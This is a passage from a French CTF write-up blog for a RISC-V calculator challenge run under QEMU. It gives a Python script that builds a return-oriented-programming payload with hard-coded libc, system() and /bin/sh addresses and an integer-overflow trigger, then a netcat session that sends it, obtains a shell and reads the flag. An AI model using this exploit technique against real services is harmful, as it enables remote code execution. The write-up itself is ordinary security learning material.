<text text-anchor='middle' x='632' y='132' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='632' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='640' y='132' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='640' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='648' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='648' y='244' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='656' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='656' y='244' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='664' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='672' y='132' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='680' y='132' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='688' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='688' y='244' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='696' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='696' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='704' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='704' y='244' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='712' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='712' y='244' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='720' y='132' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='720' y='244' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='728' y='132' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='728' y='244' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='736' y='244' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='744' y='132' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='744' y='244' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='760' y='132' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='760' y='244' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='768' y='132' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='776' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='776' y='244' fill='currentColor' style='font-size:1em'>&lt;</text>
<text text-anchor='middle' x='784' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='784' y='244' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='792' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='792' y='244' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='800' y='132' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='800' y='244' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='808' y='132' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='808' y='244' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='816' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='816' y='244' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='824' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='824' y='244' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='832' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='840' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='848' y='132' fill='currentColor' style='font-size:1em'>&gt;</text>
</g>

    </svg>
  
</div>
<p>Voil√† le script que j&rsquo;ai fait pour automatiser la t√¢che d&rsquo;√©crire le payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">   3ba86:       60e2                    ld      ra,24(sp)
</span></span></span><span class="line"><span class="cl"><span class="s2">   3ba88:       6522                    ld      a0,8(sp)
</span></span></span><span class="line"><span class="cl"><span class="s2">   3ba8a:       6105                    add     sp,sp,32
</span></span></span><span class="line"><span class="cl"><span class="s2">   3ba8c:       8082                    ret
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x4000824000</span>
</span></span><span class="line"><span class="cl"><span class="n">system_address</span> <span class="o">=</span> <span class="mh">0x4000869688</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_address</span> <span class="o">=</span> <span class="mh">0x400092c6c8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">first_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3ba86</span>
</span></span><span class="line"><span class="cl"><span class="n">second_gadget</span> <span class="o">=</span> <span class="mh">0x41414141</span>
</span></span><span class="line"><span class="cl"><span class="n">third_gadget</span> <span class="o">=</span> <span class="mh">0x42424242</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># First stage : Creating the 0th operations to trigger overflow</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">first_stage</span> <span class="o">=</span> <span class="s2">&#34;(1*1)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Second stage : Generating 17 dummy operations</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Replacing some of &#34;0(0)&#34; expressions by &#34;-0&#34; because it takes less characters and inputs is limited at 128 chars.</span>
</span></span><span class="line"><span class="cl"><span class="n">second_stage</span> <span class="o">=</span> <span class="s2">&#34;-----0&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">17</span> <span class="o">-</span> <span class="mi">5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">second_stage</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;0(</span><span class="si">{</span><span class="n">second_stage</span><span class="si">}</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Third stage : Adding gadgets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">third_stage</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">first_stage</span><span class="si">}</span><span class="s2">(</span><span class="si">{</span><span class="n">second_stage</span><span class="si">}</span><span class="s2">+</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">first_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">first_gadget</span><span class="o">-</span><span class="n">second_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">+</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">binsh_address</span><span class="o">-</span><span class="n">second_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">-</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">binsh_address</span><span class="o">-</span><span class="n">third_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">+</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">system_address</span><span class="o">-</span><span class="n">third_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Last stage : Adding Integer overflow with handle_power function : </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fourth_stage</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;(</span><span class="si">{</span><span class="n">third_stage</span><span class="si">}</span><span class="s2">)**8188&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fourth_stage</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ((1*1)(0(0(0(0(0(0(0(0(0(0(0(0(-----0))))))))))))+274886687366-273791891781+273792730503-273775887494+273775088710))**8188</span>
</span></span></code></pre></div><p>Etant donn√© que le <code>sysroot</code> fourni avec le challenge ne comportait pas de binaire <code>sh</code>, on ne peut pas tester notre exploit en local on va donc la lancer directement en remote et comme l&rsquo;input est alphanum√©rique uniquement on a m√™me pas besoin de pwntools üòâ:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">nc</span> <span class="n">instances</span><span class="p">.</span><span class="n">challenge</span><span class="o">-</span><span class="n">ecw</span><span class="p">.</span><span class="n">fr</span> <span class="mi">42556</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> <span class="p">((</span><span class="mi">1</span><span class="o">*</span><span class="mi">1</span><span class="p">)(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="mi">0</span><span class="p">(</span><span class="o">-----</span><span class="mi">0</span><span class="p">))))))))))))</span><span class="o">+</span><span class="mi">274886687366</span><span class="o">-</span><span class="mi">273791891781</span><span class="o">+</span><span class="mi">273792730503</span><span class="o">-</span><span class="mi">273775887494</span><span class="o">+</span><span class="mi">273775088710</span><span class="p">))</span><span class="o">**</span><span class="mi">8188</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">id</span>
</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span>
</span></span><span class="line"><span class="cl"><span class="n">calculator</span><span class="o">-</span><span class="n">shadow</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">qemu</span><span class="o">-</span><span class="n">riscv64</span><span class="o">-</span><span class="n">shadow</span>
</span></span><span class="line"><span class="cl"><span class="n">run</span>
</span></span><span class="line"><span class="cl"><span class="n">sysroot</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">ECW</span><span class="p">{</span><span class="mi">1</span><span class="n">n57ruc710n_5375_w4n7_70_b3_fr33</span><span class="p">}</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>J&rsquo;ai beaucoup aim√© ce challenge parce qu&rsquo;il √©tait tr√®s original et vraiment r√©aliste tout en me permettant d&rsquo;en apprendre plus sur l&rsquo;API frontend des tcg QEMU!</p>
</div>
  
    <div class="mt-16">

</div>
  
</article>
      </div>
    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
  <div class="flex justify-center items-center h-footer-height">
    <div
      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
    >
      <nav>
        <ul class="flex text-md space-x-3 sm:space-x-6">
          
        </ul>
      </nav>
      <span class="text-muted hidden md:block">
        &copy;
        2024
        <a
          href="https://github.com/ntk148v/hugo-toigian"
          class="font-bold hover:underline"
          >hugo-toigian</a
        >
      </span>
      <div id="header-theme-button">
        <svg
          id="dark_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
          />
        </svg>
        <svg
          id="light_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
          />
        </svg>
      </div>
    </div>
  </div>
</footer>
</body>
</html>
